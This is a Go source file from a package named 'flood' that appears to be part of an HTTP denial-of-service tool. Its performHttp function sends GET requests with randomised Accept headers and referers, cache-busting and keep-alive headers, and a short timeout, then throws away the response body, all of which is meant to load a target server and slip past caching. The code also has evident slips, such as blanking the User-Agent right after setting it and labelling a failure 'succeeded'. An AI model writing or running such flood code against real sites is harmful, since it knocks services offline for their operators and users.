package flood

import (
	"context"
	"errors"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

func (t *Target) performHttp(ctx context.Context, addr string) error {
	ctx, cancel := context.WithTimeout(ctx, time.Millisecond*500)
	defer cancel()
	method := "GET"
	request, err := http.NewRequestWithContext(ctx, method, addr, nil)
	if err != nil {
		return err
	}
	request.Header.Set("Connection", "Keep-Alive")
	request.Header.Set("User-Agent", userAgent())
	accept := acceptall[rand.Intn(len(acceptall))]
	request.Header["User-Agent"] = []string{}
	request.Header.Set("Pragma", "no-cache")
	request.Header.Set("Cache-Control", "no-transform,no-store")
	request.Header.Set("Keep-Alive", "timeout=1000")
	request.Header.Set("Accept-Encoding", "gzip,deflate")

	for _, l := range strings.Split(accept, "\r\n") {
		if l == "" {
			continue
		}
		h := strings.Split(l, ": ")
		request.Header.Add(h[0], h[1])
	}
	request.Header.Set("Referrer", referers[rand.Intn(len(referers))])

	body, err := t.httpClient.Do(request)
	if err == nil {
		_, err = io.Copy(ioutil.Discard, body.Body)
		body.Body.Close()
		if body.StatusCode/100 != 2 {
			return errors.New("succeeded")
		}
	}
	return err
}
